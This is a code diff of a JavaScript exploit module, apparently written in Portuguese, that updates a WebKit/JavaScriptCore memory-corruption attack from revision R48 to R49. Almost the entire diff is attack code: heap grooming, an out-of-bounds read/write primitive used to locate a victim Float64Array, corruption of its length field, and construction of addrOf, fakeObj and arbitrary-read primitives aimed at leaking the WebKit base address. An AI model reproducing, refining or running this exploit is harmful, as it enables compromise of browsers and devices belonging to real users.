@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v87_GroomedDirectCorruption - R48 - Grooming + Busca Ampla)
+// js/script3/testArrayBufferVictimCrash.mjs (v88_CorrectedSearch - R49 - Busca Corrigida e Primitivas Refinadas)
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
@@ -11,7 +11,7 @@ import {
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS, OOB_CONFIG } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V87_GDC_R48_WEBKIT = "Heisenbug_GroomedDirectCorruption_v87_GDC_R48_WebKitLeak";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V88_CS_R49_WEBKIT = "Heisenbug_CorrectedSearch_v88_CS_R49_WebKitLeak";
 
 // --- Globais para a primitiva de exploit ---
 let addrOf_primitive = null;
@@ -46,47 +46,45 @@ function unbox(float_val) {
     return new AdvancedInt64(int_conversion_view[0]);
 }
 
-export async function executeTypedArrayVictimAddrofAndWebKitLeak_R48() { // Nome atualizado para R48
-    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V87_GDC_R48_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Grooming e Busca Direta (R48) ---`, "test", FNAME_CURRENT_TEST_BASE);
-    document.title = `${FNAME_CURRENT_TEST_BASE} Init R48...`;
+export async function executeTypedArrayVictimAddrofAndWebKitLeak_R49() { // Nome atualizado para R49
+    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V88_CS_R49_WEBKIT;
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Busca Corrigida e Primitivas Refinadas (R49) ---`, "test", FNAME_CURRENT_TEST_BASE);
+    document.title = `${FNAME_CURRENT_TEST_BASE} Init R49...`;
 
-    targetFunctionForLeak = function someUniqueLeakFunctionR48_Instance() { return `target_R48_${Date.now()}`; };
-    logS3(`Função alvo para addrof (targetFunctionForLeak) recriada.`, 'info');
+    targetFunctionForLeak = function someUniqueLeakFunctionR49_Instance() { return `target_R49_${Date.now()}`; };
+    logS3(`Função alvo para addrof (targetFunctionForLeak) recriada.`, "info");
 
     let iter_primary_error = null;
-    let iter_addrof_result = { success: false, msg: "Addrof (R48): Not run." };
-    let iter_webkit_leak_result = { success: false, msg: "WebKit Leak (R48): Not run." };
+    let iter_addrof_result = { success: false, msg: "Addrof (R49): Not run." };
+    let iter_webkit_leak_result = { success: false, msg: "WebKit Leak (R49): Not run." };
 
     try {
-        // --- Fase 1 (R48): Heap Grooming e Preparação da Vítima ---
-        logS3(`  --- Fase 1 (R48): Heap Grooming e Preparação da Vítima ---`, "subtest", FNAME_CURRENT_TEST_BASE);
+        logS3(`  --- Fase 1 (R49): Heap Grooming e Preparação da Vítima ---`, "subtest", FNAME_CURRENT_TEST_BASE);
         const GROOM_COUNT = 1000;
         let groom_array = new Array(GROOM_COUNT);
         for (let i = 0; i < GROOM_COUNT; i++) {
-            groom_array[i] = new Float64Array(8); // Aloca os arrays do groom
+            groom_array[i] = new Float64Array(8);
         }
         logS3(`  Heap Grooming: ${GROOM_COUNT} arrays alocados.`, "info");
         
-        const victim_array = groom_array[Math.floor(GROOM_COUNT / 2)]; // Escolhe um do meio para ser a vítima
-        const marker = new AdvancedInt64(0xCAFEBABE, 0xDEADBEEF); // Novo marcador único
+        const victim_array = groom_array[Math.floor(GROOM_COUNT / 2)];
+        const marker = new AdvancedInt64(0xCAFEBABE, 0xDEADBEEF);
         victim_array.fill(box(marker));
         logS3(`  Array vítima (índice ${Math.floor(GROOM_COUNT / 2)}) preenchido com o marcador: ${marker.toString(true)}`, "info");
-        
-        // Libera a memória do array de grooming para não segurar referências desnecessárias
         groom_array = null;
         
-        // --- Fase 2 (R48): Ativação do OOB e Busca na Memória ---
-        logS3(`  --- Fase 2 (R48): Ativação do OOB e Busca na Memória ---`, "subtest", FNAME_CURRENT_TEST_BASE);
+        logS3(`  --- Fase 2 (R49): Ativação do OOB e Busca na Memória ---`, "subtest", FNAME_CURRENT_TEST_BASE);
         await triggerOOB_primitive({ force_reinit: true });
         if (!isOOBReady()) throw new Error("Falha ao configurar o ambiente OOB.");
 
         let victim_data_offset = -1;
-        const search_limit = 1024 * 1024; // Aumenta drasticamente a janela de busca para 1MB
-        logS3(`  Iniciando busca pelo marcador na memória (limite: ${search_limit / 1024}KB)...`, "info");
         
-        for (let i = 0; i < search_limit; i += 4) {
-            const current_offset = OOB_CONFIG.BASE_OFFSET_IN_DV + i;
+        // --- CORREÇÃO R49: Lógica de busca corrigida ---
+        const search_start_offset = OOB_CONFIG.BASE_OFFSET_IN_DV;
+        const search_end_offset = OOB_CONFIG.ALLOCATION_SIZE - 8; // Garante que não lemos 8 bytes além do buffer
+        logS3(`  Iniciando busca pelo marcador na memória (range: ${toHex(search_start_offset)} a ${toHex(search_end_offset)})...`, "info");
+        
+        for (let current_offset = search_start_offset; current_offset < search_end_offset; current_offset += 4) {
             if(oob_read_absolute(current_offset, 4) === marker.low()){
                 if(oob_read_absolute(current_offset + 4, 4) === marker.high()){
                     victim_data_offset = current_offset;
@@ -100,14 +98,10 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R48() { // Nome
         }
         logS3(`  SUCESSO: Marcador do buffer de dados do array vítima encontrado no offset: ${toHex(victim_data_offset)}`, "vuln");
 
-        // --- Fase 3 (R48): Corrupção Direta e Construção das Primitivas ---
-        logS3(`  --- Fase 3 (R48): Corrupção Direta e Construção das Primitivas ---`, "subtest", FNAME_CURRENT_TEST_BASE);
-
+        logS3(`  --- Fase 3 (R49): Corrupção Direta e Construção das Primitivas ---`, "subtest", FNAME_CURRENT_TEST_BASE);
         const LIKELY_OFFSET_FROM_DATA_TO_VIEW_HEADER = 32;
         const offset_of_view_header = victim_data_offset - LIKELY_OFFSET_FROM_DATA_TO_VIEW_HEADER;
         const offset_to_corrupt = offset_of_view_header + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
-
-        logS3(`  Corrompendo 'm_length' no offset calculado: ${toHex(offset_to_corrupt)}`, "warn");
         oob_write_absolute(offset_to_corrupt, 0xFFFFFFFF, 4);
 
         if (victim_array.length < 1000) {
@@ -115,18 +109,19 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R48() { // Nome
         }
         logS3(`  SUCESSO: Comprimento do 'victim_array' corrompido para: ${victim_array.length}`, "vuln");
 
-        // Com o 'victim_array' agora sendo uma janela para a memória, podemos construir as primitivas.
+        // --- CORREÇÃO R49: Primitivas addrOf/fakeObj refinadas ---
         addrOf_primitive = (obj) => {
-            victim_array[10] = obj; // Coloca o objeto em um índice
-            return unbox(victim_array[11]); // Lê um objeto adjacente no heap como se fosse um float
+            victim_array[30] = obj; // Coloca o objeto em um índice conhecido do nosso array com 'length' gigante
+            return unbox(victim_array[31]); // Lê o valor da posição adjacente, que deve conter o ponteiro "vazado"
         };
         fakeObj_primitive = (addr) => {
-            victim_array[12] = box(addr); // Escreve o endereço como um float
-            return victim_array[13]; // Lê de volta como um objeto
+            victim_array[32] = box(addr); // Escreve o endereço como um float em uma posição
+            return victim_array[33]; // Lê de volta a posição adjacente, que o motor interpretará como um objeto
         };
-        
+        logS3("  Primitivas 'addrOf' e 'fakeObj' refinadas definidas.", "info");
+
         let leaked_target_function_addr = addrOf_primitive(targetFunctionForLeak);
-        logS3(`  [TESTE AddrOf] Tentativa de leak de targetFunctionForLeak: ${leaked_target_function_addr.toString(true)}`, "leak");
+        logS3(`  [TESTE AddrOf] Endereço vazado de targetFunctionForLeak: ${leaked_target_function_addr.toString(true)}`, "leak");
 
         if (!isValidPointer(leaked_target_function_addr)) {
             throw new Error(`addrOf retornou um ponteiro inválido: ${leaked_target_function_addr.toString(true)}`);
@@ -134,12 +129,15 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R48() { // Nome
         iter_addrof_result = { success: true, msg: "addrOf obteve endereço com sucesso.", leaked_object_addr: leaked_target_function_addr.toString(true) };
         logS3("  [TESTE AddrOf] SUCESSO: Primitivas validadas.", "good");
 
-        // --- Fase 4 (R48): WebKit Base Leak ---
-        logS3(`  --- Fase 4 (R48): WebKit Base Leak ---`, "subtest", FNAME_CURRENT_TEST_BASE);
-
+        logS3(`  --- Fase 4 (R49): WebKit Base Leak ---`, "subtest", FNAME_CURRENT_TEST_BASE);
         arb_read_v2 = (addr) => {
-            // A primitiva de leitura agora usa o fakeObj para criar um array falso
-            let fake_array = fakeObj_primitive(addr.sub(new AdvancedInt64(0, JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET)));
+            // A butterfly de um Float64Array aponta para si mesmo.
+            // Para ler um endereço, criamos um objeto falso que é um ArrayBufferView,
+            // e cujo ponteiro de dados (m_vector) aponta para o endereço desejado.
+            // O JSObject header tem 16 bytes. O m_vector está em +16.
+            // Portanto, o objeto falso precisa apontar para addr - 16.
+            const fake_obj_addr = addr.sub(new AdvancedInt64(0, 16));
+            let fake_array = fakeObj_primitive(fake_obj_addr);
             return unbox(fake_array[0]);
         };
         
@@ -159,8 +157,8 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R48() { // Nome
 
     } catch (e) {
         iter_primary_error = e;
-        logS3(`  ERRO na iteração R48: ${e.message}`, "critical", FNAME_CURRENT_TEST_BASE);
-        console.error(`Erro na iteração R48:`, e);
+        logS3(`  ERRO na iteração R49: ${e.message}`, "critical", FNAME_CURRENT_TEST_BASE);
+        console.error(`Erro na iteração R49:`, e);
     } finally {
         await clearOOBEnvironment();
     }
@@ -172,7 +170,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R48() { // Nome
     };
     
     logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
-    logS3(`Final result (R48): ${JSON.stringify(result, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);
+    logS3(`Final result (R49): ${JSON.stringify(result, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);
     
     return result;
 }
